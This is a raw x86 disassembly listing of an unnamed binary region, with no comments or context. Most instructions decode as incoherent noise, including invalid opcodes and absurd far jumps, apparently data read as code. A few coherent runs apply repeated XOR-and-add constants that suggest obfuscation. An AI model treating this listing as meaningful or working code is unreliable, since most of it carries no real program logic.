  40c2b6:	pop    ecx
  40c2b7:	pushf  
  40c2b8:	sbb    ebp,ebx
  40c2ba:	jmp    0x94a0:0x299a69f
  40c2c1:	loopne 0x40c322
  40c2c3:	xchg   edx,eax
  40c2c4:	add    BYTE PTR [edx+0x26204614],cl
  40c2ca:	enter  0xedbb,0x61
  40c2ce:	shl    BYTE PTR [eax+0x7c],0xd8
  40c2d2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c2d3:	popf   
  40c2d4:	mov    dl,0x23
  40c2d6:	and    al,0xb5
  40c2d8:	xchg   esi,eax
  40c2d9:	pop    es
  40c2da:	popf   
  40c2db:	add    cl,BYTE PTR [ebx-0x2bf5367b]
  40c2e1:	and    al,0xf1
  40c2e3:	jmp    0x40c346
  40c2e5:	arpl   ax,di
  40c2e7:	mov    ebp,0xccc69b3b
  40c2ec:	adc    eax,0x1ebc41c3
  40c2f1:	imul   esp,esp,0xb26c37fd
  40c2f7:	pop    ecx
  40c2f8:	sbb    DWORD PTR [ebx],eax
  40c2fa:	sub    dl,ch
  40c2fc:	daa    
  40c2fd:	adc    al,0xa3
  40c2ff:	fcom   DWORD PTR [ebp-0xc]
  40c302:	test   al,0xc9
  40c304:	xchg   al,cl
  40c306:	sbb    eax,0x8ac5d56e
  40c30b:	jmp    0x40c2be
  40c30d:	adc    cl,bh
  40c30f:	ins    BYTE PTR es:[edi],dx
  40c310:	call   0x8ddaa0fc
  40c315:	jmp    0x19c0:0x5ff4c443
  40c31c:	sti    
  40c31d:	addr16 dec edx
  40c31f:	and    edx,DWORD PTR [edi+eax*2-0x7f]
  40c323:	adc    BYTE PTR [ecx],dl
  40c325:	mov    esp,0x7836c657
  40c32a:	xchg   ebx,eax
  40c32b:	add    ebp,DWORD PTR [edx-0x1d]
  40c32e:	inc    eax
  40c32f:	or     ah,0x40
  40c332:	ja     0x40c364
  40c334:	fnstcw WORD PTR [ecx+ecx*1-0x2cf16cc6]
  40c33b:	xlat   BYTE PTR ds:[ebx]
  40c33c:	imul   ebx,DWORD PTR [ebp*4-0x464b626c],0xcc523925
  40c347:	add    DWORD PTR [ecx],ecx
  40c349:	xor    BYTE PTR [ecx-0x57],dh
  40c34c:	xchg   ecx,eax
  40c34d:	sub    bh,bl
  40c34f:	xchg   DWORD PTR [ebp-0x51e37e2d],eax
  40c355:	dec    eax
  40c356:	adc    al,0x5b
  40c358:	fcomp  DWORD PTR [edx]
  40c35a:	sti    
  40c35b:	and    edx,edi
  40c35d:	fwait
  40c35e:	jge    0x40c3c7
  40c360:	mov    ebx,DWORD PTR [ebx-0x8]
  40c363:	pop    edx
  40c364:	adc    al,0xeb
  40c366:	inc    ebx
  40c367:	(bad)  
  40c368:	gs retf 
  40c36a:	sub    esi,DWORD PTR [edx+0x6806cc83]
  40c370:	(bad)  
  40c371:	icebp  
  40c372:	and    DWORD PTR [esi-0x23],esi
  40c375:	clc    
  40c376:	add    cl,ah
  40c378:	pop    esi
  40c379:	pop    ss
  40c37a:	jno    0x40c3fa
  40c37c:	outs   dx,BYTE PTR ds:[esi]
  40c37d:	push   ebx
  40c37e:	mov    cl,0xda
  40c380:	rol    DWORD PTR [edi+edx*1+0xf39dfd7],1
  40c387:	das    
  40c388:	rol    BYTE PTR [esi-0x10],cl
  40c38b:	imul   DWORD PTR [ebx+0x1c]
  40c38e:	shl    edi,0x3d
  40c391:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c392:	xor    DWORD PTR [ebx-0x2b5766cb],edx
  40c398:	sbb    eax,0x2c35fbdf
  40c39d:	lahf   
  40c39e:	dec    ecx
  40c39f:	xor    BYTE PTR [ecx+0x1ec403bc],dh
  40c3a5:	loope  0x40c346
  40c3a7:	sub    al,0x65
  40c3a9:	or     esi,ebx
  40c3ab:	fidivr WORD PTR [esi-0x40]
  40c3ae:	inc    esi
  40c3af:	div    DWORD PTR [esi+eax*4+0x3a]
  40c3b3:	in     al,0x9c
  40c3b5:	outs   dx,DWORD PTR ds:[esi]
  40c3b6:	lods   al,BYTE PTR ds:[esi]
  40c3b7:	hlt    
  40c3b8:	test   eax,0xc6180698
  40c3bd:	sbb    bl,BYTE PTR [ebp-0x14]
  40c3c0:	cs dec esp
  40c3c2:	add    ebp,DWORD PTR [esi-0x35]
  40c3c5:	jp     0x40c42d
  40c3c7:	inc    esi
  40c3c8:	(bad)  
  40c3c9:	leave  
  40c3ca:	retf   
  40c3cb:	fstp   DWORD PTR [edx+edx*8-0x70]
  40c3cf:	fldenv [edi+0x3482a79d]
  40c3d5:	or     al,0x1f
  40c3d7:	pusha  
  40c3d8:	push   0xffffff89
  40c3da:	xchg   BYTE PTR [eax+0x47f5de7e],dh
  40c3e0:	dec    edi
  40c3e1:	daa    
  40c3e2:	lock sar eax,0xba
  40c3e6:	jne    0x40c373
  40c3e8:	inc    ebp
  40c3e9:	cld    
  40c3ea:	mov    ecx,0x7510854
  40c3ef:	xor    eax,ecx
  40c3f1:	mov    edx,0x32729b
  40c3f6:	add    eax,edx
  40c3f8:	mov    DWORD PTR [ebp+0x8],eax
  40c3fb:	mov    eax,DWORD PTR [ebp-0x18]
  40c3fe:	xor    eax,ecx
  40c400:	add    eax,edx
  40c402:	mov    edx,DWORD PTR [ebp+0x14]
  40c405:	imul   eax,DWORD PTR [edx]
  40c408:	mov    edx,DWORD PTR [ebp-0x4]
  40c40b:	xor    edx,ecx
  40c40d:	mov    ecx,DWORD PTR [ebp+0x8]
  40c410:	lea    ecx,[edx+ecx*1+0x32729b]
  40c417:	cmp    ecx,eax
  40c419:	je     0x40cbb9
  40c41f:	mov    edi,DWORD PTR [ebp-0x18]
  40c422:	mov    eax,DWORD PTR [ebp+0x8]
  40c425:	mov    edx,DWORD PTR [ebp+0x14]
  40c428:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  40c42c:	mov    ecx,0x7510854
  40c431:	xor    edx,edx
  40c433:	xor    edi,ecx
  40c435:	jmp    0x40c698
  40c43a:	dec    ebp
  40c43b:	scas   al,BYTE PTR es:[edi]
  40c43c:	push   ss
  40c43d:	pop    ebx
  40c43e:	cmc    
  40c43f:	arpl   WORD PTR [ecx-0x58],si
  40c442:	pop    esi
  40c443:	clc    
  40c444:	push   ss
  40c445:	rcr    edx,cl
  40c447:	lea    ebp,[ebp+0x7e821461]
  40c44d:	jle    0x40c487
  40c44f:	jl     0x40c4cf
  40c451:	jle    0x40c4d1
  40c453:	lea    eax,[ecx-0x59]
  40c456:	enter  0x39cf,0x20
  40c45a:	ins    DWORD PTR es:[edi],dx
  40c45b:	ja     0x40c46c
  40c45d:	cs nop
  40c45f:	sbb    edi,DWORD PTR [ecx-0x6e]
  40c462:	loopne 0x40c458
  40c464:	mov    ecx,0x82668f37
  40c469:	mov    ds:0x180df946,al
  40c46e:	lods   eax,DWORD PTR ds:[esi]
  40c46f:	fidivr WORD PTR [edx+ecx*8-0x12c1667]
  40c476:	aad    0x29
  40c478:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c479:	out    dx,al
  40c47a:	push   eax
  40c47b:	mov    BYTE PTR [ecx+0x4a710baa],dh
  40c481:	retf   0x4736
  40c484:	aaa    
  40c485:	sub    DWORD PTR [edi-0xc29797f],ebp
  40c48b:	(bad)  
  40c48c:	sti    
  40c48d:	xor    al,0xf7
  40c48f:	and    ax,0x7a3
  40c493:	enter  0xccd6,0x70
  40c497:	ud1    edx,DWORD PTR [ecx]
  40c49a:	or     esp,edi
  40c49c:	nop
  40c49d:	mov    ds:0xe582a573,eax
  40c4a2:	cmp    eax,0xc0d2d3a7
  40c4a7:	jae    0x40c46e
  40c4a9:	lods   eax,DWORD PTR ds:[esi]
  40c4aa:	inc    esp
  40c4ab:	sub    DWORD PTR [edx+0x3],ebx
  40c4ae:	pop    edi
  40c4af:	xchg   BYTE PTR [ebp-0x474f137f],al
  40c4b5:	leave  
  40c4b6:	and    DWORD PTR [eax+eax*4+0x5c49f469],esp
  40c4bd:	xchg   ecx,eax
  40c4be:	sbb    eax,0x5d95e3cd
  40c4c3:	mov    ebp,0x7c6e6ab9
  40c4c8:	or     ah,ah
  40c4ca:	frstor [edi]
  40c4cc:	and    esp,DWORD PTR [ebp+0xb]
  40c4cf:	out    dx,al
  40c4d0:	mov    ch,0x3d
  40c4d2:	nop
  40c4d3:	fadd   DWORD PTR [ebp-0x2943279c]
  40c4d9:	out    dx,al
  40c4da:	jb     0x40c54c
  40c4dc:	xor    dl,BYTE PTR [eax]
  40c4de:	mov    ah,0x66
  40c4e0:	lea    esi,[eax]
  40c4e2:	inc    edi
  40c4e3:	dec    edx
  40c4e4:	nop
  40c4e5:	mov    al,0xb6
  40c4e7:	fucomip st,st(4)
  40c4e9:	adc    al,0x81
  40c4eb:	mov    esp,0x2236e74f
  40c4f0:	clc    
  40c4f1:	rol    ecx,cl
  40c4f3:	jl     0x40c4f3
  40c4f5:	xlat   BYTE PTR ds:[ebx]
  40c4f6:	clc    
  40c4f7:	xlat   BYTE PTR ds:[ebx]
  40c4f8:	pop    ecx
  40c4f9:	jbe    0x40c4ea
  40c4fb:	xor    eax,0x59901fcd
  40c500:	jge    0x40c4c8
  40c502:	mov    esp,0xd6c6bb54
  40c507:	out    dx,al
  40c508:	outs   dx,BYTE PTR ds:[esi]
  40c509:	jecxz  0x40c4e9
  40c50b:	xchg   ah,cl
  40c50d:	outs   dx,BYTE PTR ds:[esi]
  40c50e:	add    BYTE PTR [edx-0x5943c370],0x9b
  40c515:	stos   DWORD PTR es:[edi],eax
  40c516:	ins    BYTE PTR es:[edi],dx
  40c517:	lea    ebp,[eax-0x7600b4e5]
  40c51d:	out    dx,eax
  40c51e:	pusha  
  40c51f:	je     0x40c4bb
  40c521:	mov    esp,0xbc423f92
  40c526:	dec    esi
  40c527:	stos   DWORD PTR es:[edi],eax
  40c528:	dec    eax
  40c529:	adc    BYTE PTR [ecx],bl
  40c52b:	bound  eax,QWORD PTR [esi+0x1b46d798]
  40c531:	dec    edx
  40c532:	mov    ch,0x19
  40c534:	push   ss
  40c535:	adc    al,0xb0
  40c537:	or     BYTE PTR [edi+0x647d20b9],bh
  40c53d:	mov    bh,0x4d
  40c53f:	jmp    0x40c546
  40c541:	and    BYTE PTR [ecx],ah
  40c543:	cs xchg esp,eax
  40c545:	xor    eax,0xace4a76f
  40c54a:	sub    al,0x83
  40c54c:	not    dh
  40c54e:	add    BYTE PTR ds:0x314935bd,ah
  40c554:	out    0xff,eax
  40c556:	das    
  40c557:	push   esi
  40c558:	cmp    al,0x38
  40c55a:	or     ah,bl
  40c55c:	bnd jp 0x40c529
  40c55f:	fstp   DWORD PTR [edi]
  40c561:	int    0xc5
  40c563:	jmp    DWORD PTR [eax+0x31e9bf]
  40c569:	call   0x3ea8:0x44841441
  40c570:	hlt    
  40c571:	aas    
  40c572:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c573:	iret   
  40c574:	jecxz  0x40c553
  40c576:	push   ebp
  40c577:	push   0x2fd3d75e
  40c57c:	sahf   
  40c57d:	cmc    
  40c57e:	xchg   DWORD PTR [edi],edi
  40c580:	stos   DWORD PTR es:[edi],eax
  40c581:	mov    cl,0xa2
  40c583:	ret    
  40c584:	cmp    al,0x20
  40c586:	test   DWORD PTR [edx+0x6be09336],ecx
  40c58c:	hlt    
  40c58d:	lgs    esp,FWORD PTR [ebx+0x78]
  40c591:	clc    
  40c592:	enter  0xda5c,0xd2
  40c596:	sbb    eax,0x9c015515
  40c59b:	mov    edi,0xd2f94e57
  40c5a0:	mov    bh,0x8a
  40c5a2:	add    al,0x57
  40c5a4:	cmp    dh,BYTE PTR [esi+0x71]
  40c5a7:	inc    edi
  40c5a8:	xor    al,0xfa
  40c5aa:	retf   
  40c5ab:	(bad)  
  40c5ac:	jmp    0x27c37d12
  40c5b1:	shr    DWORD PTR [esi],1
  40c5b3:	iret   
  40c5b4:	stos   BYTE PTR es:[edi],al
  40c5b5:	mov    edi,0xf4691d5d
  40c5ba:	test   eax,0x5baa832d
  40c5bf:	rcl    BYTE PTR [edx+0x70792c1c],0x6
  40c5c6:	xor    al,0xb9
  40c5c8:	clc    
  40c5c9:	fstp   DWORD PTR ds:0xd1ebfb54
  40c5cf:	inc    edx
  40c5d0:	out    0xf3,eax
  40c5d2:	jns    0x40c5c0
  40c5d4:	push   ebp
  40c5d5:	sti    
  40c5d6:	neg    DWORD PTR [esi+0x1cff5d97]
  40c5dc:	xchg   ebx,esp
  40c5de:	ja     0x40c601
  40c5e0:	inc    esp
  40c5e1:	mov    BYTE PTR [edi-0x42],0x9a
  40c5e5:	popa   
  40c5e6:	jne    0x40c651
  40c5e8:	lods   eax,DWORD PTR ds:[esi]
  40c5e9:	mov    eax,DWORD PTR [edi+0x4b]
  40c5ec:	bound  edx,QWORD PTR [esi-0x49]
  40c5ef:	pop    es
  40c5f0:	ins    BYTE PTR es:[edi],dx
  40c5f1:	pop    edx
  40c5f2:	add    BYTE PTR [edi+0x510322bd],bh
  40c5f8:	adc    bh,BYTE PTR [esi-0x7bcbda39]
  40c5fe:	sbb    bh,BYTE PTR [ecx]
  40c600:	(bad)  
  40c601:	out    0xb4,al
  40c603:	mov    DWORD PTR [ebx+0x1e],ebx
  40c606:	cmc    
  40c607:	mov    al,0x35
  40c609:	xchg   ebp,eax
  40c60a:	out    0x3e,al
  40c60c:	outs   dx,DWORD PTR ds:[esi]
  40c60d:	adc    eax,0x6dcb142b
  40c612:	inc    ecx
  40c613:	mov    ch,ah
  40c615:	xchg   edx,eax
  40c616:	xlat   BYTE PTR ds:[ebx]
  40c617:	or     DWORD PTR [ecx],0xcf91f91f
  40c61d:	mov    bh,BYTE PTR [eax]
  40c61f:	cmp    BYTE PTR [esp+edi*8-0x5cee4270],bh
  40c626:	mov    ecx,0xfbc33743
  40c62b:	mov    ds:0x21e0548c,eax
  40c630:	sub    al,0x70
  40c632:	aad    0x17
  40c634:	dec    edx
  40c635:	add    DWORD PTR [edx+0x43b47c3e],edi
  40c63b:	cli    
  40c63c:	xchg   esi,eax
  40c63d:	and    ebp,esp
  40c63f:	adc    ebx,DWORD PTR [eax+0x4f045309]
  40c645:	in     al,dx
  40c646:	(bad)  
  40c647:	sub    dl,BYTE PTR es:[edx]
  40c64a:	jmp    0xecdfff94
  40c64f:	or     BYTE PTR [ecx],bl
  40c651:	xchg   esp,eax
  40c652:	pop    ebx
  40c653:	push   eax
  40c654:	out    dx,eax
  40c655:	(bad)  
  40c656:	(bad)  
  40c657:	inc    esi
  40c658:	and    eax,0xa102eeda
  40c65d:	outs   dx,DWORD PTR ds:[esi]
  40c65e:	es dec edi
  40c660:	adc    DWORD PTR [ebx],eax
  40c662:	pop    edi
  40c663:	div    BYTE PTR ds:0x7eeceaf7
  40c669:	pop    ebx
  40c66a:	add    bh,BYTE PTR [eax+0x4a]
  40c66d:	scas   al,BYTE PTR es:[edi]
  40c66e:	repnz inc edi
  40c670:	mov    esi,0xaeaec7f8
  40c675:	or     ch,bh
  40c677:	push   cs
  40c678:	and    BYTE PTR [edi-0x25],bh
  40c67b:	pop    ebp
  40c67c:	mov    eax,ds:0xfa5f9b33
  40c681:	inc    ecx
  40c682:	shr    ecx,cl
  40c684:	push   cs
  40c685:	cwde   
  40c686:	push   es
  40c687:	or     bh,BYTE PTR [edi+0x601aed03]
  40c68d:	cmp    eax,0x7278c83d
  40c692:	addr16 daa 
  40c694:	dec    ebp
  40c695:	sub    dh,bl
  40c697:	mov    esi,0x32729bbe
  40c69c:	add    BYTE PTR [ebx],al
  40c69e:	(bad)  
  40c69f:	div    edi
  40c6a1:	mov    edx,DWORD PTR [ebp-0x4]
  40c6a4:	xor    edx,ecx
  40c6a6:	lea    eax,[edx+eax*1+0x32729b]
  40c6ad:	mov    edx,DWORD PTR [ebp+0x8]
  40c6b0:	mov    edi,DWORD PTR [ebp-0x24]
  40c6b3:	mov    DWORD PTR [edi+edx*4],eax
  40c6b6:	mov    eax,DWORD PTR [ebp-0x18]
  40c6b9:	mov    edx,DWORD PTR [ebp+0x8]
  40c6bc:	xor    eax,ecx
  40c6be:	lea    eax,[eax+edx*1+0x32729b]
  40c6c5:	mov    DWORD PTR [ebp+0x8],eax
  40c6c8:	mov    eax,DWORD PTR [ebp-0x18]
  40c6cb:	jmp    0x40c92e
  40c6d0:	leave  
  40c6d1:	adc    bl,ah
  40c6d3:	cmp    eax,0x10f1ede3
  40c6d8:	xor    BYTE PTR [ebp-0xa0653f],dl
  40c6de:	cli    
  40c6df:	aaa    
  40c6e0:	fiadd  WORD PTR [eax+0x7c387e7e]
  40c6e6:	jle    0x40c766
  40c6e8:	sub    edx,DWORD PTR [esi-0x16031288]
  40c6ee:	bound  eax,QWORD PTR [eax+0x54be79b7]
  40c6f4:	ja     0x40c76f
  40c6f6:	and    ecx,esi
  40c6f8:	push   cs
  40c6f9:	aad    0x73
  40c6fb:	xchg   esp,eax
  40c6fc:	std    
  40c6fd:	std    
  40c6fe:	mov    eax,0x8f76d2a7
  40c703:	xchg   edx,eax
  40c704:	leave  
  40c705:	test   BYTE PTR [eax-0x1a],bl
  40c708:	push   cs
  40c709:	lahf   
  40c70a:	cmp    eax,0x9c716b72
  40c70f:	out    dx,al
  40c710:	pop    esp
  40c711:	(bad)  
  40c712:	fimul  DWORD PTR [edi+0x1a]
  40c715:	xor    edx,DWORD PTR [edx+eax*4]
  40c718:	arpl   WORD PTR [eax-0x43],ax
  40c71b:	pushf  
  40c71c:	fsub   QWORD PTR [eax]
  40c71e:	pusha  
  40c71f:	mov    ds:0xe18acf77,eax
  40c724:	jae    0x40c72b
  40c726:	les    edx,FWORD PTR [edx+0x163252b8]
  40c72c:	add    ch,BYTE PTR [ebp+0x3b]
  40c72f:	hlt    
  40c730:	(bad)  
  40c731:	jne    0x40c6d4
  40c733:	mov    dh,0x45
  40c735:	mov    al,0xd9
  40c737:	mov    edx,0x8a07ab56
  40c73c:	add    esi,DWORD PTR [ebx-0x2a]
  40c73f:	es xchg edx,eax
  40c741:	sbb    bh,al
  40c743:	arpl   WORD PTR [ebx-0x7210ea0e],dx
  40c749:	adc    BYTE PTR [edx],cl
  40c74b:	mov    esi,0xee7498da
  40c750:	push   edx
  40c751:	in     al,dx
  40c752:	jl     0x40c7a0
  40c754:	push   esi
  40c755:	test   eax,0xdf843bed
  40c75a:	loope  0x40c7a5
  40c75c:	cmp    BYTE PTR [esp+ebp*2],bh
  40c75f:	push   esi
  40c760:	imul   eax,DWORD PTR [ecx],0xffffff98
  40c763:	add    BYTE PTR [ecx+0x2b],dh
  40c766:	push   ss
  40c767:	xchg   ecx,eax
  40c768:	sbb    BYTE PTR ds:0x733b3baf,ch
  40c76e:	sbb    ebx,DWORD PTR [ebx]
  40c770:	sub    al,0x41
  40c772:	add    ch,BYTE PTR [eax-0x4efd310e]
  40c778:	fsubr  st(2),st
  40c77a:	sub    al,0x6e
  40c77c:	imul   DWORD PTR [ecx-0x38]
  40c77f:	push   0x93788a56
  40c784:	cmp    eax,0xc3655c84
  40c789:	(bad)  
  40c78a:	shl    BYTE PTR [edx-0x50],cl
  40c78d:	jg     0x40c73c
  40c78f:	jns    0x40c7b7
  40c791:	jmp    0x40c74e
  40c793:	in     al,dx
  40c794:	out    0x5,al
  40c796:	and    DWORD PTR [esi+0x4f],0xbaa1eb44
  40c79d:	sbb    al,0x2d
  40c79f:	inc    edx
  40c7a0:	fidivr DWORD PTR [edx-0x45]
  40c7a3:	mov    ecx,DWORD PTR [ecx+0x214d310c]
  40c7a9:	in     al,dx
  40c7aa:	inc    eax
  40c7ac:	adc    ch,dh
  40c7ae:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c7af:	mov    ah,0x73
  40c7b1:	iret   
  40c7b2:	xchg   BYTE PTR ds:0x316f5fae,bh
  40c7b8:	and    al,0xfc
  40c7ba:	jb     0x40c786
  40c7bc:	nop
  40c7bd:	(bad)  
  40c7be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40c7bf:	aaa    
  40c7c0:	retf   0x1ff5
  40c7c3:	push   edx
  40c7c4:	jg     0x40c769
  40c7c6:	outs   dx,BYTE PTR ds:[esi]
  40c7c7:	rcr    DWORD PTR ds:0xf1ac2864,1
  40c7cd:	enter  0xe391,0xff
  40c7d1:	push   edi
  40c7d2:	mov    ?,WORD PTR [ecx]
  40c7d4:	or     DWORD PTR [edx+0x4533befb],0xc96e564d
  40c7de:	add    BYTE PTR [edx-0x7028ea2e],ch
  40c7e4:	adc    BYTE PTR [ecx],0xef
  40c7e7:	mov    ch,0xcb
  40c7e9:	retf   0x646d
  40c7ec:	sbb    al,0x98
  40c7ee:	and    al,0xc7
  40c7f0:	jno    0x40c795
  40c7f2:	jae    0x40c7b1
  40c7f4:	(bad)  
  40c7f5:	test   DWORD PTR [eax],0xad44b0c6
  40c7fb:	or     BYTE PTR [esi-0x71035637],al
  40c801:	out    dx,eax
  40c802:	mov    ds:0xc92426f1,al
  40c807:	xchg   ecx,esp
  40c809:	mov    ds:0x260ca1c3,al
  40c80e:	push   edx
  40c80f:	test   BYTE PTR [eax+0x58],cl
  40c812:	add    BYTE PTR [edx],0xfa
  40c815:	inc    esi
  40c816:	ret    0x6e9a
  40c819:	sbb    eax,DWORD PTR [esi-0x2361cde2]
  40c81f:	mov    dh,0xbc
  40c821:	pusha  
  40c822:	je     0x40c7ff
  40c824:	mov    bl,0xa9
  40c826:	test   al,0x9e
  40c828:	xchg   ebx,eax
  40c829:	loope  0x40c808
  40c82b:	cmp    edx,ebx
  40c82d:	jg     0x40c80a
  40c82f:	sbb    bl,BYTE PTR [edi]
  40c831:	jo     0x40c898
  40c833:	sti    
  40c834:	sbb    ah,BYTE PTR [eax-0x4d5dd314]
  40c83a:	mov    cl,0xd9
  40c83c:	mov    edx,DWORD PTR [edx]
  40c83e:	arpl   WORD PTR [edi],si
  40c840:	push   edx
  40c841:	hlt    
  40c842:	pop    es
  40c843:	cmp    BYTE PTR [eax],ah
  40c845:	(bad)  
  40c846:	inc    ebx
  40c847:	sub    BYTE PTR gs:[ebx],0x47
  40c84b:	sub    eax,0x231ae422
  40c850:	adc    eax,DWORD PTR [edx+ebp*1-0x5f]
  40c854:	mov    al,ds:0x77c4b3e3
  40c859:	and    DWORD PTR [edi+0x3c],ebx
  40c85c:	dec    edi
  40c85d:	les    edi,FWORD PTR [ebx-0x4f]
  40c860:	mov    edi,esp
  40c862:	inc    esi
  40c863:	cs adc eax,0xe3d50396
  40c869:	jecxz  0x40c8c1
  40c86b:	xor    eax,0x33e74e40
  40c870:	dec    esp
  40c871:	push   cs
  40c872:	mov    dh,0x4f
  40c874:	dec    ecx
  40c875:	bound  edi,QWORD PTR [ebx+edi*1+0x7db44f21]
  40c87c:	mov    esi,DWORD PTR [esi-0x2c75a720]
  40c882:	cmp    BYTE PTR [edi-0x37],0x46
  40c886:	mov    ah,0xe4
  40c888:	jp     0x40c818
  40c88a:	test   DWORD PTR [edx],0x77db97be
  40c890:	mov    BYTE PTR [eax+0x48],0xd7
  40c894:	int3   
  40c895:	mov    DWORD PTR [ebx+ebp*2],ebp
  40c898:	in     al,dx
  40c899:	mov    bl,0x16
  40c89b:	frstor [edi+0x25]
  40c89e:	xlat   BYTE PTR ds:[ebx]
  40c89f:	jns    0x40c855
  40c8a1:	fistp  DWORD PTR [esi+0x48]
  40c8a4:	pop    edi
  40c8a5:	or     dl,0xff
  40c8a8:	jl     0x40c871
  40c8aa:	jmp    0x40c925
  40c8ac:	mov    eax,ds:0x2f03280d
  40c8b1:	push   ss
  40c8b2:	ja     0x40c8eb
  40c8b4:	or     BYTE PTR [edx+0x348a0e4f],bh
  40c8ba:	(bad)  
  40c8bb:	sti    
  40c8bc:	test   DWORD PTR [edx+0x2e],ebx
  40c8bf:	xchg   esi,eax
  40c8c0:	sti    
  40c8c1:	cmp    al,0xf8
  40c8c3:	repz add DWORD PTR [edi-0x4d],esp
  40c8c7:	cld    
  40c8c8:	push   esi
  40c8c9:	mov    bh,0xe6
  40c8cb:	xchg   BYTE PTR ds:0xb802a15,ah
  40c8d1:	es sub eax,0xcb4111b8
  40c8d7:	daa    
  40c8d8:	jmp    0xaadf4e4
  40c8dd:	xchg   BYTE PTR [eax+0x11],al
  40c8e0:	adc    esp,0x45
  40c8e3:	(bad)  
  40c8e4:	cld    
  40c8e5:	pop    esi
  40c8e6:	push   edx
  40c8e7:	lahf   
  40c8e8:	adc    dh,BYTE PTR [ecx]
  40c8ea:	add    al,0x1e
  40c8ec:	mov    al,0xf3
  40c8ee:	xchg   edi,eax
  40c8ef:	fst    DWORD PTR [eax+0x34]
  40c8f2:	(bad)  
  40c8f3:	fiadd  WORD PTR [esi+0x3b]
  40c8f6:	jb     0x40c884
  40c8f8:	cwde   
  40c8f9:	ret    
  40c8fa:	cmp    al,BYTE PTR [ecx+0x514c4c6d]
  40c900:	xchg   ecx,eax
  40c901:	cdq    
  40c902:	xor    al,0x26
  40c904:	push   ebx
  40c905:	pop    ss
  40c906:	mov    ds:0x6e6e9c86,eax
  40c90b:	lds    esp,FWORD PTR [eax]
  40c90d:	and    BYTE PTR [ebx+0x40625965],bh
  40c913:	dec    edi
  40c914:	push   0xd78f6c90
  40c919:	mov    edx,DWORD PTR [ebp-0x29b665d3]
  40c91f:	adc    al,0x5c
  40c921:	es out dx,eax
  40c923:	sub    eax,0xcd9f1583
  40c928:	jecxz  0x40c924
  40c92a:	ret    0x37b2
  40c92d:	mov    bl,0x8b
  40c92f:	push   ebp
  40c930:	adc    al,0x33
  40c932:	shr    ecx,0x5e
  40c935:	add    al,BYTE PTR [eax]
  40c937:	add    BYTE PTR [edi],al
  40c939:	mov    ah,0x6
  40c93b:	cwde   
  40c93c:	mov    ch,0xa8
  40c93e:	mov    eax,ds:0x31ca67b1
  40c943:	cmp    DWORD PTR [edi-0x672d0002],esi
  40c949:	mov    ?,WORD PTR [esi+0x7e]
  40c94c:	cmp    BYTE PTR [esi+edi*2+0x7e],bh
  40c950:	adc    ebx,DWORD PTR [edi+0x3e]
  40c953:	imul   edi,DWORD PTR [ebp-0x65e13739],0xffffffc1
  40c95a:	add    esp,DWORD PTR [edi+ebp*8+0x10]
  40c95e:	jmp    0x289e6396
  40c963:	push   ebp
  40c964:	lock icebp 
  40c966:	jg     0x40c9b0
  40c968:	div    eax
  40c96a:	xor    dl,BYTE PTR [edi-0x46ad90fd]
  40c970:	ficomp WORD PTR [edi]
  40c972:	and    BYTE PTR [edi],bl
  40c974:	jecxz  0x40c927
  40c976:	adc    edi,0x767a4e0b
  40c97c:	retf   0x8b0
  40c97f:	ins    BYTE PTR es:[edi],dx
  40c980:	xor    edi,eax
  40c982:	aas    
  40c983:	xchg   esp,eax
  40c984:	sbb    BYTE PTR [ebx-0x60],cl
  40c987:	jnp    0x40c998
  40c989:	loope  0x40ca07
  40c98b:	mov    cl,0xe8
  40c98d:	(bad)  
  40c98e:	cld    
  40c98f:	push   ss
  40c990:	out    0x4e,eax
  40c992:	inc    eax
  40c993:	cdq    
  40c994:	push   cs
  40c995:	shl    BYTE PTR [esi-0x120ef50],cl
  40c99b:	jp     0x40c985
  40c99d:	jnp    0x40c9a6
  40c99f:	fwait
  40c9a0:	mov    bl,0x5d
  40c9a2:	aaa    
  40c9a3:	sti    
  40c9a4:	into   
  40c9a5:	jns    0x40c980
  40c9a7:	into   
  40c9a8:	push   esi
  40c9a9:	inc    ecx
  40c9aa:	xchg   esi,eax
  40c9ab:	mov    ebx,0xd4a963b5
  40c9b0:	mov    edi,0xf0e10f64
  40c9b5:	lea    ebx,[ebx+0x50]
  40c9b8:	in     al,dx
  40c9b9:	lea    ebx,[ebx]
  40c9bb:	dec    edi
  40c9bc:	retf   
  40c9bd:	fbld   TBYTE PTR [edi]
  40c9bf:	dec    edx
  40c9c0:	sbb    eax,0x5c64019e
  40c9c5:	xor    al,0xb1
  40c9c7:	dec    edi
  40c9c8:	out    0x52,eax
  40c9ca:	sahf   
  40c9cb:	and    eax,0xdc3efa0e
  40c9d0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c9d1:	sub    edx,DWORD PTR [ebx-0x19]
  40c9d4:	sbb    BYTE PTR [esi],0x72
  40c9d7:	call   0x9b25:0x6df06443
  40c9de:	retf   
  40c9df:	aam    0x89
  40c9e1:	sub    eax,0xa576caf1
  40c9e6:	jno    0x40c976
  40c9e8:	adc    eax,0x32c0d3a6
  40c9ed:	dec    esp
  40c9ee:	sub    eax,0xb4677a8e
  40c9f3:	and    DWORD PTR [edx],ebp
  40c9f5:	mov    cl,0x2a
  40c9f7:	jns    0x40ca57
  40c9f9:	stos   BYTE PTR es:[edi],al
  40c9fa:	lock clc 
  40c9fc:	data16 add ax,0xeeb3
  40ca01:	xchg   ecx,eax
  40ca02:	or     dl,BYTE PTR [edx]
  40ca04:	les    edx,FWORD PTR [esi+0x47cd22bf]
  40ca0a:	gs aas 
  40ca0c:	mov    esi,0x68fdb12b
  40ca11:	sti    
  40ca12:	dec    edi
  40ca13:	pop    esp
  40ca14:	stc    
  40ca15:	pop    eax
  40ca16:	jl     0x40ca0b
  40ca18:	stc    
  40ca19:	shl    DWORD PTR [edi],0xb3
  40ca1c:	icebp  
  40ca1d:	popa   
  40ca1e:	les    esp,FWORD PTR [edx]
  40ca20:	loop   0x40ca74
  40ca22:	int    0xbc
  40ca24:	loope  0x40c9f7
  40ca26:	iret   
  40ca27:	and    dh,BYTE PTR [edx+0x735a9f5]
  40ca2d:	mov    ds:0x2a82e451,al
  40ca32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ca33:	arpl   dx,dx
  40ca35:	les    esp,FWORD PTR [edi]
